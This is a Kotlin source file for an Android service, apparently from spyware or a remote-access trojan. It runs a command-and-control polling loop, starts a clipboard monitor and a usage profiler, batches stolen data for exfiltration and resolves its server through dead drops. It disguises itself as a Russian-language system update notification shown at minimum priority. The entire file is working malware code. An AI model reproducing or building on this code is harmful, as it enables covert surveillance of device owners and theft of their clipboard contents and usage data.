package com.sp.core.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.sp.core.c2.Commands
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import com.sp.core.util.Prefs
import com.sp.core.util.DeadDrop
import com.sp.core.worker.BatchFlushWorker
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

/**
 * The single long-lived foreground service. It hosts the clipboard monitor,
 * the usage-stats profiler and the 45-minute batch flush, so the device only
 * ever shows a single low-importance system notification.
 */
class C2Service : Service() {

    override fun onCreate() {
        super.onCreate()
        try {
            startForeground(NOTIF_ID, buildNotification())
        } catch (t: Throwable) {
            // Android 12+ refuses foreground services without the matching
            // permission or from a background start - never kill the process.
            stopSelf()
            return
        }

        ClipboardMonitor.start(this)
        BatchFlushWorker.schedulePeriodic(this)

        poller.postDelayed(pollTask, 15_000L)

        try {
            // Plain background service (the C2 service is in the foreground, so
            // the background-start restriction does not apply here).
            startService(Intent(this, UsageStatsService::class.java))
        } catch (_: Throwable) {
        }

        // Background: recover the C2 endpoint from the dead-drop sources.
        Thread {
            try { DeadDrop.resolve(this) } catch (_: Throwable) {}
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        BatchExfil.enqueue(this, "startup", """{"pid":${android.os.Process.myPid()},"ts":${System.currentTimeMillis()}}""")
        return START_STICKY
    }

    override fun onDestroy() {
        poller.removeCallbacksAndMessages(null)
        ClipboardMonitor.stop()
        super.onDestroy()
    }

    /**
     * Command channel: the agent polls the C2 for queued commands. FCM is
     * optional, this channel works without a Firebase project.
     */
    private fun pollCommands() {
        try {
            val base = Exfil.baseUrl(this) ?: return
            val deviceId = Prefs.deviceId(this)
            val key = URLEncoder.encode(Exfil.apiKeyValue() ?: "", "UTF-8")
            val url = "$base/poll?device_id=$deviceId&k=$key"
            val req = Request.Builder().url(url).get().build()
            pollClient.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return
                val body = resp.body?.string() ?: return
                val arr = JSONArray(body)
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    val cmd = o.optString("cmd")
                    if (cmd.isBlank()) continue
                    val argsObj = o.optJSONObject("args") ?: JSONObject()
                    val args = HashMap<String, String>()
                    argsObj.keys().forEach { k -> args[k] = argsObj.optString(k) }
                    try {
                        Commands.dispatch(this, cmd, args)
                        BatchExfil.enqueue(this, "cmd_result", """{"cmd":"$cmd","ok":true}""")
                    } catch (t: Throwable) {
                        BatchExfil.enqueue(this, "cmd_result", """{"cmd":"$cmd","ok":false,"err":"${t.javaClass.simpleName}"}""")
                    }
                }
            }
        } catch (_: Throwable) {
        }
    }

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private val poller = Handler(Looper.getMainLooper())

    private val pollTask = object : Runnable {
        override fun run() {
            pollCommands()
            poller.postDelayed(this, POLL_INTERVAL_MS)
        }
    }

    companion object {
        private const val NOTIF_ID = 0x5F62
        private const val POLL_INTERVAL_MS = 45_000L

        private val pollClient = OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()
    }
}
